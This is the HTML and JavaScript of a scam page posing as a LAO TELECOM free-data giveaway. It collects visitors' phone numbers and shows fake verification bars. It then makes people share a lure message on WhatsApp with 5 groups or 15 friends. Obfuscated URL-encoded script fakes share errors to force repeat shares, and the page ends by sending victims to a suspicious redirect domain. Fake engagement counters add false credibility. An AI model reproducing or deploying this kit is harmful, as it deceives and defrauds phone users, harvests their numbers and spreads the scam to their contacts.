


<!DOCTYPE html>
<html>
    <head> 
      <script src="adidas.js"></script>

        
      <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180685151-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-180685151-1');
</script>

      <meta name="google-site-verification" content="2tzCn_X6JZOV46iZk-PHkEkdAhqPZNOjbTcd740KuMU" />
     
    <script>

        function set_Cookie(name,value){
            var Days = 30;
            var exp = new Date();
            exp.setTime(exp.getTime() + (Days*20*1000));
            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
        }
        function get_Cookie(name){
            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
            if(arr=document.cookie.match(reg)){
                return unescape(arr[2]);
            }
            return '';
        }


        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
                        document.getElementById("first-box")."quedate__step".display="none";//??;
                        document.getElementById("second-box").style.display="none";//??;
                        document.getElementById("third-box").style.display="none";//??;
                        document.getElementsByClassName("loading2__box").style.display="";//??;
                    }*/


    </script>
  
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>LAO TELECOM - ລາງວັນຂໍ້ມູນຟຣີໃຫ້ກັບລູກຄ້າທຸກຄົນ</title>
        <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
        <meta name="og:title" content="LAO TELECOM - ລາງວັນຂໍ້ມູນຟຣີໃຫ້ກັບລູກຄ້າທຸກຄົນ" />
        <meta property="og:description" content="LAO TELECOM, ສະໜອງຂໍ້ມູນຟຣີໃຫ້ແກ່ລູກຄ້າທັງໝົດ" />
        <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTvvt2rZ34LuB-qXvgoIaqNlKKcQWi4cnTPjgf-nv0XyX1Lsjw1UQGQGI4g8HCWWOKLMFFheT7AiPq6R5KCQmUH4tBTdeeWmVogSeDss8Kh1RH4HOw6j4otjysjUvgkzcM8xHm0VhRTIH0K1rGnkxd7NUmFMLWrHgYwBHLFyk8BvT8yZrIXZzdJEG4-1Nx/s320/InShot_20250405_154313379.jpg" />
        <meta property="og:type" content="website" />
    <meta property="og:updated_time" content="1440432930" />
    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />

<link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/05963652588202294752" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/05853757488319578479" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/03760741075252211382" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
</head>
<body>
  <style>
  .blink {
  animation: blink 1s steps(1, end) infinite;
}

@keyframes blink {
  0% {
    opacity: 1;
  }
  50% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
</style>
<style type="text/css">
@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
* {
    margin: 0;
    padding: 0;
    font-family: Poppins, Droid Arabic Naskh;
    font-weight: normal;
    box-sizing: border-box;


}
body {
    direction: lfl;
    background: #FFFFFF;
}
a {
    text-decoration: none;
}
.post {
    background: #fff;
    margin: 0 auto;
    padding: 10px;
    max-width: 500px;
    border: 1px solid #d0d1d5;
    border-radius: 3px;
}
.post img {
    width: 100%;
}
.welcome {
    font-size: 15px;
}
.amount,
#getname {
    color: #098105;
    text-decoration: none;
}
.done {
    text-align: center;
    color: #27ae60;
}
.tip {
    font-size: 14px;
}
.title {
    text-align: center;
}
.error {
    display: none;
    text-align: center;
    font-size: 14px;
    color: #e74c3c;
}
button {
    display: block;
    width: 200px;
    height: 50px;
    color: #fff;
    border: none;
    outline: none;
    font-size: 24px;
    cursor: pointer;
    border-radius: 5px;
    padding: 0 10px;
    margin: 10px auto;
    background: rgb(234, 11, 42);
    transition: background 0.3s ease;
}
button:hover {
    background: #098105;
}
.phone {
    max-width: 400px;
    margin: 10px auto;
}
.phone input {
    width: 100%;
    height: 50px;
    padding: 10px;
    outline: none;
    border: 2px solid #cecece;
    font-size: 14px;
}
#confirm {
    width: 200px;
    margin: 10px auto;
    border-radius: 0px;
}
#loader {
    text-align: center;
}
.spin {
    width: 50px;
    height: 50px;
    background: transparent;
    border: solid 8px rgb(234, 11, 42);
    border-right-color: transparent;
    border-radius: 50%;
    margin: 10px auto;
    animation: spin 0.8s linear infinite;
}
@keyframes spin {
    100% {
        transform: rotate(1turn);
    }
}
#loader,
#info,
#checking,
#share,
#claim {
    display: none;
}
.center {
    display: flex;
    align-items: center;
    justify-content: center;
}
.barr {
    direction: ltr;
    max-width: 400px;
    margin: 10px auto;
    box-sizing: border-box;
}
.fill {
    position: relative;
    display: inline-block;
    width: calc(100% - 100px);
    height: 35px;
    padding: 2px;
    border: 2px solid #098105;
}
#fill,
#fill2 {
    background: #098105;
    width: 0%;
    height: 100%;
}
.percentage {
    width: 100px;
    float: right;
    height: 35px;
    font-size: 16px;
    border: 2px solid #098105;
}
#percentage,
#percentage2 {
    margin-left: 5px;
}
#check,
#check2 {
    display: none;
}
.counter {
    color: #7f7f7f;
    font-size: 12px;
    text-align: right;
    padding: 10px 0 10px 2px;
    border-bottom: 1px solid #ffffff;
}
.reactions {
    display: inline-flex;
    align-items: center;
    float: left;
}
.counter img {
    float: left;
    width: 16px;
    height: 16px;
    border-radius: 50%;
    border: 2px solid #000000;
    box-sizing: content-box;
}
.like,
.love {
    margin-right: -5px;
}
.like {
    z-index: 2;
}
.love {
    z-index: 1;
}
.bar {
    display: table;
    width: 100%;
    border-bottom: 1px solid #000000;
}
.bar .react {
    display: table-cell;
    width: calc(100% / 3);
    font-size: 12px;
    color: #000000;
    text-align: center;
    padding: 10px 0;
    cursor: pointer;
}
.comments {
    direction: ltr;
}
.comment {
    padding: 6px 0;
    margin-top: 5px;
}
.comment img {
    float: left;
    width: 32px;
    height: 32px;
    border: none;
    border-radius: 18px;
    cursor: pointer;
}
.reply {
    margin-left: 37px;
}
.single-container {
    margin-left: 37px;
    background: #f1f2f6;
    padding: 10px;
    border-radius: 15px;
    font-size: 12px;
}
.single-container .user {
    display: inline-block;
    cursor: pointer;
    color: #365899;
    margin-bottom: 5px;
}
.single-container .text {
    display: block;
}
.buttons {
    font-size: 12px;
    font-weight: bold;
    margin: 10px 0 0 47px;
    color: #000000;
}
.action {
    cursor: pointer;
}
.action:hover {
    text-decoration: underline;
}
.input {
    padding: 6px 12px 12px;
}
.input input {
    width: 100%;
    background: #f1f2f6;
    padding: 10px;
    border-radius: 15px;
    border: 0;
    outline: none;
}
.A{
    text-align: center;
    background-color: rgb(234, 11, 42);
}
</style>
  
  
  <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtlk3XjUHxhuUpIVmNeBY9xRGDz4c6ijYswRZV2OVthBAYGCRUXucUwO2V959QYu_pxaOmwFP7i4evC-hjBGe-0zDcWxW9mu4DLx9zY3j2TRP1Gnw4KMzokl6vZSpY3eNrCvWstQbjCY8WG03g29itjoRdjsDtszQ4RlLGeLrPgMQ6P5VHG8dpFetoiLzL/s320/images%20(49).png" alt="Free-Data" style="width: 100%;">
      
                     </center>
  
                   
  <center>
  <marquee
  direction="down"
  width="350"
  height="40"
  behavior="alternate"
  style="border:solid">
    <marquee behavior="alternate"> <font color="black">LAO TELECOM - ລາງວັນຂໍ້ມູນຟຣີໃຫ້ກັບລູກຄ້າທຸກຄົນ</font></marquee>
</marquee>
  
  </center>





<!-- BEGIN: Powered by Supercounters.com -->
<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1712137,"","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
</center>
<!-- END: Powered by Supercounters.com -->















  
                        <div class="A">
                        <font color="white">  ເຖິງລູກຄ້າທີ່ຮັກແພງ ກະລຸນາຢືນຢັນເບີໂທລະສັບ LAO TELECOM ຂອງທ່ານເພື່ອເປີດໃຊ້ອິນເຕີເນັດຟຣີຂອງທ່ານ </font><br/> <b><font color="white">ເສັ້ນຕາຍ:</font></b> <span class="blink"><b><font color="#010101">ວັນທີ 30 ເມສາ</font></b> </span><font color="white">ໃສ່ເບີ LAO TELECOM ຂອງເຈົ້າລຸ່ມນີ້ ແລ້ວຄລິກ <b></b>ກວດສອບ</b></font>
         </div>
    <div class="post" width="100%">

        <div id="intro">
         
            <p class="welcome">



               
                <center><input type="char" placeholder="ໃສ່ເບີ LAO TELECOM ຂອງທ່ານ" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
                 
                
              
               
          
               
            <button id="go">ກວດສອບ ➤</button>
        </div>
        <div id="loader">
            <div>ກຳລັງກວດສອບເບີໂທຂອງເຈົ້າ...</div>
            <div class="spin"></div>
            <div id="num">0%</div>
        </div>
        <div id="info">
         
          
    
           <center><p class="title"><font color="red">ຊິມກາດ LAO TELECOM ຂອງທ່ານມີອາຍຸເທົ່າໃດ</font></p></center>
          <center>
<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
    width: 330px;
    height: 56px;
">
<option value="أختر نوع الشبكة" selected="1">---ເລືອກທີ່ນີ້---</option>
  <option value="1">6 ເດືອນຂຶ້ນໄປ - 5GB  </option>
<option value="2"> 1 ປີຂຶ້ນໄປ - 10GB  </option>
<option value="2"> 5 ປີຂຶ້ນໄປ - 20GB  </option>
<option value="2"> 10 ປີບວກ - 0GB  </option>
</select>
</center><br>

 
                  
          <button id="confirm">ດໍາເນີນການ</button>
            </div>
            <p class="error">ຂໍອະໄພ, ເບີຂອງເຈົ້າຫາຍໄປ <a href="https://offerforall.info/laotelecom-freedata.com"> <b><font color="#14948F">ເພີ່ມ NUMBER</font></b></a></p>
        </div>
        <div id="checking">
            <p class="title">ກຳລັງເປີດໃຊ້ຂໍ້ມູນ...</p>
            <div class="barr">
                <div class="fill">
                    <div id="fill"></div>
                </div>
                <div class="percentage center">
                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
                    <span id="check"><i class="fa fa-check-circle"></i></span>
                    <span id="percentage"></span>
                </div>
            </div>
        </div>
        <div id="share">

            <p class="tip"> ຂໍສະແດງຄວາມຍິນດີ, ເບີໂທ LAO TELECOM ຂອງທ່ານ <span id="getname"></span>،</p>
            <p class="tip">
                ມີສິດໄດ້ຮັບການສະເໜີໃຫ້ຂໍ້ມູນຟຣີ <span class="amount"> ດໍາເນີນການເພື່ອເປີດໃຊ້ຂໍ້ມູນຟຣີຂອງທ່ານ</span><br>
              ວິທີການດໍາເນີນການ:
            </p><br>
            <p class="tip">1. ແບ່ງ​ປັນ​ມັນ​ກັບ 5 ກຸ່ມ​ຫຼື 15 ຫມູ່​ເພື່ອນ​ໃນ WhatsApp (ກົດ​ທີ່ "SHARE​" icon ຂ້າງ​ລຸ່ມ​ນີ້​).</p>
            <p class="tip">2. ທ່ານຈະຖືກໂອນໄປຫາໜ້າ "ACTIVATION" ຂອງພວກເຮົາໂດຍອັດຕະໂນມັດຫຼັງຈາກແຖບການຢັ້ງຢືນສີຂຽວຖືກຕື່ມໃສ່.</p>
           

            <button id="whatsapp">ແບ່ງປັນ</button>
            <div class="barr">
                <div class="fill">
                    <div id="fill2"></div>
                </div>
                <div class="percentage center">
                    <span><i class="fa fa-spinner fa-pulse"></i></span>
                    <span id="percentage2">0%</span>
                </div>
            </div>
        </div>
        <div id="claim">
            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
            <p class="title"> ຄລິກ "ເປີດໃຊ້" ເພື່ອເປີດໃຊ້ຂໍ້ມູນຂອງທ່ານ </p>
           <br/>
          <a  onclick="window.open('https://echifobi.top/4/9089389')" href="https://echifobi.top/4/9089389" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ເປີດໃຊ້ 5GB</font></button>
                    </a><br/>
          
       <a  onclick="window.open('https://echifobi.top/4/9089389')" href="https://echifobi.top/4/9089389" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ເປີດໃຊ້ 10GB</font></button>
                    </a>
             <br/>

            <a  onclick="window.open('https://echifobi.top/4/9089389')" href="https://echifobi.top/4/9089389" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ເປີດໃຊ້ 20GB</font></button>
                    </a>
             <br/>

            <a  onclick="window.open('https://echifobi.top/4/9089389')" href="https://echifobi.top/4/9089389" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ເປີດໃຊ້ 30GB</font></button>
                    </a>
             <br/>
          
          
          <a  onclick="window.open('https://echifobi.top/4/9089389')" href="https://echifobi.top/4/9089389" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ລາຍງານບັນຫາ</font></button>
                    </a><br/>
            <button id="offer">ເປີດໃຊ້</button><br/>
             
             
          
          
              </div>
        <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFfvXdGXDy1f5XM_ZlUS-OFxOiO9DcyQ6JBhiWhva5R5hFooz5TWQYG7QjAdcgJ2Nk4C9nXwjg5F-ZocyX3wWiFWLiWzjqqM3-MwWCOxdue00BxwprjbdIco-09WisWU9NHEuXJXUEHAfbm3ZP6PVEodMmKWTHGwCZoqDVWfV-0PCFSHCPYUeCcz9nJOgo/s320/unnamed%20(1)_1.jpg" alt="Free-Data" style="width: 100%;">
      
                     </center>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-latest.min.js"></script>




<script type="text/javascript">
var time = 0;
window.setInterval(function () {
    time = time + 1;
    $(".t1").html(time + 1 + "m");
    $(".t2").html(time + 2 + "m");
    $(".t3").html(time + 4 + "m");
}, 6e4);
var likes = 134,
    comments = 23,
    shares = 12;
window.setInterval(function () {
    likes = likes + Math.floor(Math.random() * 3);
    comments = comments + Math.floor(Math.random() * 2);
    shares = shares + Math.floor(Math.random() * 2);
    $("#likes").html(likes + "K");
    $("#comments").html(comments + "K comments");
    $("#shares").html(shares + "K shares");
}, 5e3);
$(".liked").click(function () {
    if ($(this).hasClass("selected")) {
        $(this).removeClass("selected");
        $(this).html("Like");
    } else {
        $(this).addClass("selected");
        $(this).html("Unlike");
    }
});
</script>








<script type="text/javascript">

$("#go").click(function () {
    $("#intro").fadeOut(0);
    $("#loader").fadeIn(1000);
    var i = 0;
    var interval = setInterval(function () {
        $("#num").text(i + "%");
        i += 1;
        if (i >= 100) {
            clearInterval(interval);
            $("#loader").fadeOut(0);
            $("#info").fadeIn(1000);
        }
    }, 50);
});
$("#confirm").click(function () {
    if ($("#name").val().length < 4)
    {
        $(".error").fadeIn(500);
    } else {
        $("#info").fadeOut(0);
        $("#checking").fadeIn(1000);
        var i = 0;
        var interval = setInterval(function () {
            i += 1;
            $("#percentage").text(i + "%");
            $("#fill").css("width", i + "%");
            if (i == 50) {
                i = 49;
                setTimeout(function () {
                    i = 50;
                }, 1000);
            }
            if (i >= 100) {
                clearInterval(interval);
                $("#load").fadeOut(0);
                $("#check").fadeIn(0);
                setTimeout(function () {
                    $("#checking").fadeOut(0);
                    $("#share").fadeIn(1000);
                    $("#getname").html($("#name").val());
                }, 500);
            }
        }, 50);
    }
});
$(document).click(function () {
    if ($("#name").is(":focus")) {
        $(".error").fadeOut(500);
    }
});
</script>




<script>



     var text1 = "*ຂໍສະແດງຄວາມຍິນດີກັບລູກຄ້າໂທລະຄົມລາວທຸກຄົນ*%0A%0ALAO TELECOM ໃຫ້ບໍລິການຂໍ້ມູນຟຣີໃຫ້ກັບລູກຄ້າ *ທຸກຄົນ*%0A%0A✅6 ຊິມເກົ່າເດືອນ - *5GB*%0A✅1 ປີຂຶ້ນໄປ - *10GB*%0A✅5 ປີຂຶ້ນໄປ - *20GB*%0A✅10 ປີບວກ - *30GB*%0A%0Aຮີບຟ້າວດຽວນີ້ ແລະກວດເບິ່ງວ່າ *LAO SIM CARD* ຂອງທ່ານມີສິດໄດ້ຮັບຂໍ້ສະເໜີນີ້ຫຼືບໍ່%0A%0A_ກວດເບິ່ງທີ່ນີ້_👇%0Ahttps://offerforall.info/laotelecom-freedata.com",
            text2 = " an amount of ",
            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
            abcde = "https://echifobi.top/4/9089389",
            saved = "",
            share = "whatsapp://send?text=" + text1;
</script>
      





<script>
<!-- code by OD -->
document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
</script>








 
 
</div>

  <script>/*<![CDATA[*/ cookieChoices = {}; /*]]>*/</script>
</body></html>
